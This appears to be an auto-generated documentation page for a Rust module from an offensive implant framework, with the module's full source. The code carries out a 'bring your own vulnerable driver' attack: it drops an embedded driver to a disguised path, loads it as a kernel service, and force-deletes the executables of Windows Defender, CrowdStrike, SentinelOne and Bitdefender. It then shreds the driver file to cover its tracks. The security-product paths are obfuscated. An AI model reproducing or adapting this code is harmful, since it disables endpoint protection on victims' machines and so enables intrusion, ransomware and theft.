# mod

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/evasion/byovd/mod.rs` |
| **Lines** | 67 |
| **Cards** | T018-byovd |
| **Role** | BYOVD module |
| **Feature gates** | byovd |

## Constants

- `DRIVER_BYTES`: `&[u8]` = `&[]`

## Public API

### `execute_blind_run` (line 14)
```rust
pub fn execute_blind_run() -> Result<()>
```
Ejecuta el pipeline completo de BYOVD:
1. Drop del driver en disco (ruta camuflada)
2. Registrar como servicio kernel
3. Abrir handle al device
4. Matar procesos EDR (PPLs)
5. Cerrar handle
6. Detener y eliminar servicio
7. Shred del archivo .sys en disco

## Internal Functions

- `kill_edr_processes` (line 53)

## Key Dependencies

- `use anyhow::Result;`

## Full Source

```rust
pub mod driver;
pub mod service;

use anyhow::Result;

/// Ejecuta el pipeline completo de BYOVD:
/// 1. Drop del driver en disco (ruta camuflada)
/// 2. Registrar como servicio kernel
/// 3. Abrir handle al device
/// 4. Matar procesos EDR (PPLs)
/// 5. Cerrar handle
/// 6. Detener y eliminar servicio
/// 7. Shred del archivo .sys en disco
pub fn execute_blind_run() -> Result<()> {
    // Contenido del driver IMFForceDelete.sys embebido
    #[cfg(feature = "byovd")]
    const DRIVER_BYTES: &[u8] = include_bytes!(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../assets/byovd_driver/IMFForceDelete.sys"
    ));

    #[cfg(not(feature = "byovd"))]
    const DRIVER_BYTES: &[u8] = &[];

    if DRIVER_BYTES.is_empty() {
        return Ok(());
    }

    // 1. Drop en ruta camuflada
    let driver_path = driver::drop_driver(DRIVER_BYTES)?;

    // 2. Registrar servicio
    service::register_and_start(&driver_path)?;

    // 3. Abrir device
    let h_driver = driver::open_device()?;

    // 4. Matar EDRs
    let kill_result = kill_edr_processes(h_driver);

    // 5. Cerrar handle
    driver::close_device(h_driver).ok();

    // 6. Detener y eliminar servicio
    service::stop_and_delete().ok();

    // 7. Shred del archivo
    driver::shred_driver_file(&driver_path).ok();

    kill_result
}

fn kill_edr_processes(h_driver: winapi::um::winnt::HANDLE) -> Result<()> {
    // Lista de procesos EDR conocidos (usar obf!() en producción)
    let targets = [
        crate::obf!("C:\\Program Files\\Windows Defender\\MsMpEng.exe"),
        crate::obf!("C:\\Program Files\\CrowdStrike\\CSFalconService.exe"),
        crate::obf!("C:\\Program Files\\Sentinel\\SentinelAgent.exe"),
        crate::obf!("C:\\Program Files (x86)\\Bitdefender\\Bitdefender Agent\\bdagent.exe"),
    ];

    for target in &targets {
        let _ = driver::force_delete(h_driver, target);
    }

    Ok(())
}

```